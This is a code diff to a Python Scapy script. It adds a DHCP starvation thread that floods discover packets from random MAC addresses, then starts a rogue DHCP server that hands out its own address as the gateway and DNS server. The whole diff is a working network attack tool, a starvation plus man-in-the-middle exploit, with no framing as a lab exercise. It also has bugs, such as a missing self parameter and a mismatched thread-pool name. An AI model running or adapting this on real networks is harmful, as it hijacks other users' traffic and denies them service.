@@ -1,7 +1,7 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 
-import sys, argparse, os, signal
+import sys, argparse, os, signal, time
 import threading
 from scapy.all import *
 import re
@@ -11,6 +11,8 @@ interface = "lo"
 start_ip = "192.168.1.100"
 end_ip = "192.168.1.200"
 netmask = "255.255.255.0"
+
+threadpool = []
 
 def checkArgs():
 	global interface, start_ip, end_ip, netmask
@@ -30,14 +32,38 @@ def checkArgs():
 		print "err: start ip is larger than end ip"
 		sys.exit(2)
 
+def signal_handler(signal, frame):
+    for t in THREAD_POOL:
+        t.kill = True
+    sys.exit(0)
+
+class dhcp_starve(threading.Thread):
+	def __init__(self):
+		threading.Thread.__init__(self)
+		self.kill = False
+
+	def run():
+		global conf
+		conf.checkIPaddr = False
+
+		dhcp_discover = Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")
+		dhcp_discover /= IP(src="0.0.0.0",dst="255.255.255.255")
+		dhcp_discover /= UDP(sport=68, dport=67)
+		dhcp_discover /= BOOTP(chaddr=RandString(12,'0123456789abcdef'))
+		dhcp_discover /= DHCP(options=[("message-type","discover"),"end"]) 
+		
+		while not self.kill:
+			sendp(dhcp_discover, iface=interface)
+
+
 class dhcp_server(threading.Thread):
 	def __init__(self, **kargs):
 		threading.Thread.__init__(self)
 		self.filter="udp and src port 68 and dst port 67"
 
+		self.kill = False
 		self.parser_args(**kargs) # parse keyword arguments
 		self.pool_init() # Initialise IP Pool
-		self.daemon = True
 
 		# DHCP information
 		self.myIP = get_if_addr(interface)
@@ -54,7 +80,6 @@ class dhcp_server(threading.Thread):
 		self.T2=0
 
 		self.broadcast = ltoa(atol(self.myIP) | (0xffffffff & ~atol(self.netmask)))
-
 
 	def parser_args(self,**kargs):
 		"""Sets keyword arguments into attributes"""
@@ -85,14 +110,23 @@ class dhcp_server(threading.Thread):
 		"""Main thread function"""
 		print "running DHCP server on", self.myMAC, ":", self.myIP
 		print "sniffing..."
-		sniff(filter=self.filter,prn=self.detect_parserDhcp,store=0,iface=self.iface)
+
+		while not self.kill:
+			sniff(filter=self.filter,prn=self.detect_parserDhcp,store=0,iface=self.iface)
 
 	def detect_parserDhcp(self, pkt):
 		"""
 		receives pkt and checks if it is a DHCP packet.
 		
 		Message Types:
-		1->Discover 2->OFFER  3->Request 4->Decline 5->ACK  6->NAK  7->Release 8->Inform
+		1->Discover
+		2->OFFER
+		3->Request
+		4->Decline
+		5->ACK
+		6->NAK
+		7->Release
+		8->Inform
 		"""
 		if DHCP in pkt:
 			# Set up base packet
@@ -105,15 +139,15 @@ class dhcp_server(threading.Thread):
             				  yiaddr="0.0.0.0")/DHCP()
 
 			DhcpOption=[
-				#("client_id", self.mac2bin(pkt[Ether].src))
-				("server_id", self.myIP),
+				#('client_id', chr(1), self.mac2bin(pkt[Ether].src))
+				('server_id', self.myIP),
 				('lease_time',self.lease_time),
 				('renewal_time', self.renewal_time),
 				('rebinding_time', self.rebinding_time),
-				("subnet_mask", self.netmask),
-				("router", self.myIP),
+				('subnet_mask', self.netmask),
+				('router', self.myIP),
 				('name_server', self.myIP),
-				("broadcast_address", self.broadcast),
+				('broadcast_address', self.broadcast),
 				('default_ttl',self.default_ttl)
 			]
 
@@ -220,6 +254,7 @@ class dhcp_server(threading.Thread):
 
 if __name__ == "__main__":
 	checkArgs()
+	signal.signal(signal.SIGINT, signal_handler)
 
 	kargs = {
 		"iface": interface,
@@ -227,9 +262,11 @@ if __name__ == "__main__":
 		"start_sip": start_ip,
 		"start_eip": end_ip,
 	}
-	try:
-		t=dhcp_server(**kargs)
-		t.start()
-		
-	except KeyboardInterrupt:
-		os._exit(0)
+	t=dhcp_starve()
+	t.start()
+	time.sleep(10)
+	t.kill = True
+
+	t=dhcp_server(**kargs)
+	t.start()
+	threadpool.append(t)
